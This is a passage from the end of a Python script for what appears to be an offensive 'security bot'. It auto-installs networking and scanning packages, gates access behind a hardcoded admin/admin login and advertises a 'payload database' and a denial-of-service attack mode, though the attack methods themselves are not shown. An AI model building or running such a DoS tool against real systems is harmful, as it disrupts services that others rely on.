        self.typewriter_effect("⚠️  Remember: Only test systems you own or have explicit permission!")
        
        while True:
            try:
                print()
                command = input("Trevor Security Bot> ").strip()
                
                if not command:
                    continue
                
                if not self.process_command(command):
                    break
                    
            except KeyboardInterrupt:
                self.typewriter_effect("\n🛑 Trevor Bot interrupted by user")
                break
            except Exception as e:
                self.typewriter_effect(f"❌ Unexpected error: {str(e)}")

if __name__ == "__main__":
    required_packages = ['requests', 'beautifulsoup4', 'flask', 'pyopenssl',
                         'cryptography', 'dnspython', 'python-nmap', 'scapy']
    
    print("🔧 Checking dependencies...")
    for package in required_packages:
        try:
            __import__(package.replace('-', '_'))
        except ImportError:
            print(f"Installing {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
    
    print("\nTREVOR BOT LOGIN 2.6🚀\n")
    username = input("[*] 👤 Username: ")
    password = input("[*] 🔑 Password: ")

    if username.strip().lower() == "admin" and password.strip().lower() == "admin":
        print("\n[*] Login successful!✅")
        time.sleep(2)
        print("[*] Unlocking payload database...🔓")
        time.sleep(2)
        
        # Create bot instance first to access the method
        bot = Trevor()
        
        # Get and display public IP
        public_ip = bot.get_public_ip()
        print(f"[*] Your Public IP: {public_ip} 🌐")
        
        print("[*] Activate Trevor bot 2.6 edition dos attack and scraper bug fixed🔥🚀\n")
        time.sleep(4)
        
        # jalankan bot
        bot.run()
    else:
        time.sleep(2)
        print("❌ Incorrect username or password!")
        sys.exit()
